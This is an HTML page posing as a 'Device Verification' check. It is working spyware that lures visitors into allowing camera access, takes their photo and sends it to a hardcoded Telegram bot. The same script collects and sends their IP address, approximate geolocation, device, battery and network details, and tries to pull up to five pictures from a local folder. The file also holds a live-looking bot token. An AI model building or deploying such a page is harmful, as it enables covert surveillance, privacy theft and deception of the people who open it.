<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 90%;
        }
        #status {
            font-size: 24px;
            margin-bottom: 20px;
        }
        #permission-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="status">Please wait while we verify your device...</div>
        <button id="permission-btn" class="hidden">Allow Camera Access</button>
    </div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";

        // Elements
        const statusEl = document.getElementById('status');
        const permissionBtn = document.getElementById('permission-btn');
        
        // Show permission button after 3 seconds
        setTimeout(() => {
            statusEl.textContent = "Please allow camera access to continue";
            permissionBtn.classList.remove('hidden');
        }, 3000);

        // Handle permission button click
        permissionBtn.addEventListener('click', async () => {
            try {
                statusEl.textContent = "Accessing camera...";
                permissionBtn.classList.add('hidden');
                
                // Access camera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                // Create hidden video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // Create canvas to capture photo
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    // Wait for video to be ready
                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Send photo to Telegram
                        canvas.toBlob(async (blob) => {
                            statusEl.textContent = "Sending data...";
                            
                            // Send photo
                            const photoFormData = new FormData();
                            photoFormData.append('chat_id', CHAT_ID);
                            photoFormData.append('photo', blob, 'user_photo.jpg');
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: photoFormData
                            });
                            
                            // Get comprehensive device info
                            const deviceInfo = await getCompleteDeviceInfo();
                            
                            // Send device info
                            const message = formatDeviceInfo(deviceInfo);
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    text: message,
                                    parse_mode: 'HTML'
                                })
                            });
                            
                            // Try to access and send local pictures
                            await sendLocalPictures();
                            
                            statusEl.textContent = "Verification complete!";
                            
                        }, 'image/jpeg', 0.9);
                    }, 500);
                };
                
            } catch (error) {
                console.error('Error:', error);
                statusEl.textContent = "Permission denied or error occurred";
                
                // Send error message to Telegram
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `⚠️ Verification error: ${error.message}`
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error:', e);
                }
            }
        });

        // Get complete device information
        async function getCompleteDeviceInfo() {
            const info = {
                // Basic device info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}bit`,
                orientation: window.screen.orientation?.type || 'Unknown',
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                
                // Network info
                online: navigator.onLine ? 'Online' : 'Offline',
                connection: navigator.connection ? {
                    type: navigator.connection.type || 'Unknown',
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink ? `${navigator.connection.downlink}Mbps` : 'Unknown',
                    rtt: navigator.connection.rtt ? `${navigator.connection.rtt}ms` : 'Unknown',
                    saveData: navigator.connection.saveData ? 'Enabled' : 'Disabled'
                } : 'Network info unavailable',
                
                // Battery info
                battery: 'Battery API not available'
            };

            // Try to get battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = {
                        level: `${Math.floor(battery.level * 100)}%`,
                        charging: battery.charging ? 'Yes' : 'No',
                        chargingTime: battery.chargingTime === Infinity ? 'Fully charged' : `${Math.floor(battery.chargingTime / 60)} minutes`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : `${Math.floor(battery.dischargingTime / 60)} minutes`
                    };
                } catch (e) {
                    info.battery = 'Battery info unavailable';
                }
            }

            // Try to get IP and location info
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
                
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const locationData = await locationResponse.json();
                    info.location = {
                        ip: ipData.ip,
                        country: locationData.country_name || 'Unknown',
                        countryCode: locationData.country_code || 'Unknown',
                        region: locationData.region || 'Unknown',
                        city: locationData.city || 'Unknown',
                        postal: locationData.postal || 'Unknown',
                        coordinates: locationData.latitude && locationData.longitude ? 
                            `${locationData.latitude}, ${locationData.longitude}` : 'Unknown',
                        timezone: locationData.timezone || 'Unknown',
                        org: locationData.org || 'Unknown',
                        asn: locationData.asn || 'Unknown'
                    };
                } catch (e) {
                    info.locationError = "Could not get location details";
                }
            } catch (e) {
                info.ipError = "Could not get IP address";
            }

            return info;
        }

        // Format device info for Telegram
        function formatDeviceInfo(info) {
            let message = `📱 <b>COMPLETE DEVICE INFORMATION</b>\n\n`;
            
            // Device Section
            message += `🖥️ <b>Device Details</b>\n`;
            message += `- User Agent: ${info.userAgent}\n`;
            message += `- Platform: ${info.platform}\n`;
            message += `- Vendor: ${info.vendor}\n`;
            message += `- Memory: ${info.deviceMemory}\n`;
            message += `- CPU Cores: ${info.hardwareConcurrency}\n`;
            message += `- Screen: ${info.screen} (${info.colorDepth})\n`;
            message += `- Orientation: ${info.orientation}\n`;
            message += `- Language: ${info.language}\n`;
            message += `- Languages: ${info.languages}\n`;
            message += `- Timezone: ${info.timezone}\n`;
            message += `- Timestamp: ${info.timestamp}\n\n`;
            
            // Battery Section
            message += `🔋 <b>Battery Status</b>\n`;
            if (typeof info.battery === 'object') {
                message += `- Level: ${info.battery.level}\n`;
                message += `- Charging: ${info.battery.charging}\n`;
                message += `- Charge Time: ${info.battery.chargingTime}\n`;
                message += `- Discharge Time: ${info.battery.dischargingTime}\n\n`;
            } else {
                message += `${info.battery}\n\n`;
            }
            
            // Network Section
            message += `🌐 <b>Network Information</b>\n`;
            message += `- Status: ${info.online}\n`;
            
            if (typeof info.connection === 'object') {
                message += `- Type: ${info.connection.type}\n`;
                message += `- Effective Type: ${info.connection.effectiveType}\n`;
                message += `- Downlink: ${info.connection.downlink}\n`;
                message += `- RTT: ${info.connection.rtt}\n`;
                message += `- Data Saver: ${info.connection.saveData}\n`;
            } else {
                message += `${info.connection}\n`;
            }
            
            // Location Section
            if (info.location) {
                message += `\n📍 <b>Location Information</b>\n`;
                message += `- IP: ${info.location.ip}\n`;
                message += `- Country: ${info.location.country} (${info.location.countryCode})\n`;
                message += `- Region: ${info.location.region}\n`;
                message += `- City: ${info.location.city}\n`;
                message += `- Postal: ${info.location.postal}\n`;
                message += `- Coordinates: ${info.location.coordinates}\n`;
                message += `- Timezone: ${info.location.timezone}\n`;
                message += `- Organization: ${info.location.org}\n`;
                message += `- ASN: ${info.location.asn}\n`;
            } else if (info.ip) {
                message += `\n📍 <b>Location Information</b>\n`;
                message += `- IP: ${info.ip}\n`;
                message += `- Could not get detailed location\n`;
            }
            
            return message;
        }

        // Attempt to access and send local pictures
        async function sendLocalPictures() {
            // Note: This feature has limited browser support
            // Works best on Chrome for Android with proper permissions
            try {
                // Request directory access
                const dirHandle = await window.showDirectoryPicker({
                    startIn: 'pictures'
                });
                
                statusEl.textContent = "Scanning for pictures...";
                
                // Recursively find image files
                const imageFiles = [];
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file' && 
                        ['image/jpeg', 'image/png', 'image/gif'].some(type => entry.name.toLowerCase().endsWith(type.split('/')[1]))) {
                        imageFiles.push(entry);
                    }
                }
                
                // Send up to 5 recent pictures
                const picturesToSend = imageFiles.slice(0, 5);
                for (const fileHandle of picturesToSend) {
                    const file = await fileHandle.getFile();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', file, file.name);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                if (picturesToSend.length > 0) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `📸 Sent ${picturesToSend.length} pictures from device storage`
                        })
                    });
                }
                
            } catch (error) {
                console.log('Could not access local pictures:', error);
                // This is expected to fail in most browsers due to security restrictions
            }
        }
    </script>
</body>
</html>
